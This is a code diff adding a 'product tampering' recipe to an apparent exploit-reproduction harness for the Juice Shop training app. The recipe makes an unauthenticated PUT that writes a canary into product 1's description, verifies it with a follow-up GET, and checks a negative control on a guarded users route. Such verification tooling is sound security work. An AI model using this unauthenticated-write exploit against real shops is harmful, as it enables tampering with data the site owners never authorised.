@@ -390,6 +390,79 @@ function idorBasketRecipe(config: JuiceShopConfig): ReproductionRecipe {
   };
 }
 
+const PRODUCT_ONE_PATH = `${PRODUCTS_API_PATH}/1`;
+
+/**
+ * Checks the product record a single-product read returns. server.ts wraps finale responses in
+ * `{ status, data }` ("fix the api difference" in the autoModels loop), but the wrap is applied
+ * through a finale hook, so the check accepts a bare record as well and does not depend on which
+ * read path the hook reaches. The canary must be this product's own description.
+ */
+function canaryInProductDescription(body: string, canary: string): boolean {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(body);
+  } catch {
+    return false;
+  }
+  if (typeof parsed !== "object" || parsed === null) return false;
+  const wrapped = (parsed as { data?: unknown }).data;
+  const product = wrapped ?? parsed;
+  if (typeof product !== "object" || product === null) return false;
+  const description = (product as Record<string, unknown>).description;
+  return typeof description === "string" && description.includes(canary);
+}
+
+/**
+ * Unauthenticated write on `PUT /api/Products/:id` (the "Product Tampering" challenge). In the
+ * pinned v17.3.0 server.ts the only authorization line for that route is commented out:
+ * `// app.put('/api/Products/:id', security.isAuthorized())`, so finale serves the update to any
+ * caller. `POST /api/Products` and `DELETE /api/Products/:id` keep their guards.
+ *
+ * The exploit writes the run's canary into product 1's description with no Authorization header.
+ * The follow-up is an unauthenticated `GET /api/Products/1`, which is decisive because the
+ * canary has to be stored to come back: the exploit's own echo proves nothing about persistence.
+ *
+ * The negative control is an unauthenticated `PUT /api/Users/1`, which server.ts guards with
+ * `.put(security.denyAll())`. A denied write answers 401 (expressJwt with a random secret rejects
+ * every token), which is accepted as a complete leg. The control body carries the canary in
+ * `email`, so an accepted write would echo it back and be treated as a dirty control.
+ */
+function productTamperingRecipe(config: JuiceShopConfig): ReproductionRecipe {
+  return {
+    id: "juice-shop-product-tampering-unauth",
+    title: "Unauthenticated product update via PUT /api/Products/:id",
+    keywords: [
+      "auth bypass",
+      "broken access control",
+      "missing authentication",
+      "product tampering",
+      PRODUCTS_API_PATH,
+    ],
+    fixture: registrationFixture(config),
+    negativeControl: {
+      method: "PUT",
+      path: `${USERS_PATH}/1`,
+      body: { email: CANARY_PLACEHOLDER },
+    },
+    negativeControlAcceptedStatuses: [401],
+    exploit: {
+      method: "PUT",
+      path: PRODUCT_ONE_PATH,
+      body: { description: CANARY_PLACEHOLDER },
+    },
+    // A raw body match is enough here: the control only has to stay clean, and a coincidental
+    // echo would fail closed as ANALYSIS_ONLY rather than produce a false REPRODUCED.
+    oracleCheck: (response, canary) =>
+      response.status >= 200 && response.status < 300 && response.body.includes(canary),
+    exploitFollowUp: {
+      buildRequest: () => ({ method: "GET", path: PRODUCT_ONE_PATH }),
+      oracleCheck: (response, canary) =>
+        response.status === 200 && canaryInProductDescription(response.body, canary),
+    },
+  };
+}
+
 const FTP_PATH = "/ftp";
 const FTP_BACKUP_FILE = "package.json.bak";
 
@@ -538,6 +611,7 @@ export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
       sqliSearchRecipe(target.config),
       loginBypassRecipe(target.config),
       idorBasketRecipe(target.config),
+      productTamperingRecipe(target.config),
       ftpPoisonNullByteRecipe(target.config),
       ssrfProfileImageRecipe(target.config),
       domXssSearchRecipe(),
